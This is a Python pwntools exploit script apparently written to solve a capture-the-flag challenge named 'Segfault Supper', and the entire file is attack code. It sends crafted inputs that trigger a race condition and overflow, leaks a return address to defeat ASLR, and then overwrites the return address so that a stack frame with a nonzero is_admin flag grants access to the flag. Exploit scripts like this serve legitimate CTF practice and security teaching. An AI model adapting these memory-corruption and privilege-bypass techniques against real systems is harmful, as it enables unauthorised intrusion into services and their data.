#!/usr/bin/env python3
from pwn import *
import random
import binascii
import time

import argparse

parser = argparse.ArgumentParser(description="Exploit for Segfault Supper. Try increasing --timeout if it doesn't work consistently.")
parser.add_argument("-t", "--target", default="127.0.0.1", help="ip of target")
parser.add_argument("-p", "--port", type=int, default=1337, help="port of target")
parser.add_argument("--timeout", type=int, default=1, help="timeout in seconds for some operations")
args = parser.parse_args()

TIMEOUT = args.timeout

elf = ELF('../src/segfault_supper')

def connect(use_gdb=False):
    context.terminal = ['tmux', 'splitw', '-h']
    # p = process('../src/segfault_supper', cwd='../src')
    p = remote(args.target, args.port)
    # if use_gdb:
    #     gdb.attach(p, gdbscript="b food.c:403\nc")
    return p

def recvuntil_none(p):
    all_recvd = b''
    while True:
        recvd = p.recv(timeout=TIMEOUT)
        all_recvd += recvd
        if recvd == b'':
            break
        print(recvd.decode('ascii', errors='replace'), end='')
    return all_recvd

for i in range(3):
    print(f"Trying attempt {i+1}/3...")
    try:
        p = connect()
        user_pass = binascii.hexlify(random.randbytes(4)).decode()

        # Register a user
        register_payload = b"1\n"
        register_payload += f"{user_pass}\n".encode()
        register_payload += f"{user_pass}\n".encode()
        p.send(register_payload)

        recvuntil_none(p)

        # Leak the return address to break ASLR
        race_cond_pl = b""
        clobber = b""
        clobber += b"2\n"
        clobber += b"2\n"
        clobber += b"\n"
        race_cond_pl += clobber * 8

        p.send(race_cond_pl)
        recvuntil_none(p)

        # Log out
        p.send(b'5\n')
        time.sleep(1)

        # Log in again and retrieve leak
        p.close()
        time.sleep(1)
        p = connect(use_gdb=True)
        time.sleep(1)
        login_payload = b"2\n"
        login_payload += f"{user_pass}\n".encode()
        login_payload += f"{user_pass}\n".encode()
        p.send(login_payload)
        leaks = recvuntil_none(p)
        print(leaks)
        leak_addrs = []
        for leak in leaks.split(b"\nNull Pointer Nachos - $6.49"):
            print(leak)
            try:
                if leak.strip() != b'':
                    leak_addrs.append(u64(leak.strip().ljust(8, b'\x00')))
            except:
                pass
        for l in leak_addrs:
            print(f"0x{l:08x}")

        base_addr = leak_addrs[0] - (elf.symbols.main + 0x75)
        elf.address = base_addr

        # Delete account and create a new one
        p.send(b'4\n' + register_payload)
        recvuntil_none(p)

        # Trigger the overflow again
        race_cond_pl = b""
        clobber = b""
        clobber += b"2\n"
        clobber += b"2\n"
        # Jump to the order menu with a new stack frame where the is_admin field is nonzero
        clobber += p64(elf.symbols.run_order_cli + 335)
        clobber += b"\n"
        race_cond_pl += clobber * 4
        p.send(race_cond_pl)
        recvuntil_none(p)

        # View order and exit to trigger the overflow
        p.send(b'3\n5\n')
        recvuntil_none(p)

        # The is_admin field in our new stack frame is nonzero, so we can buy the flag
        p.send(b'9\n')
        results = p.recvuntil(b"}", timeout=TIMEOUT).decode(errors='replace')
        p.close()
        print(results)
        if 'SVUSCG{' in results:
            break
    except Exception as e:
        import traceback
        print(traceback.format_exc())
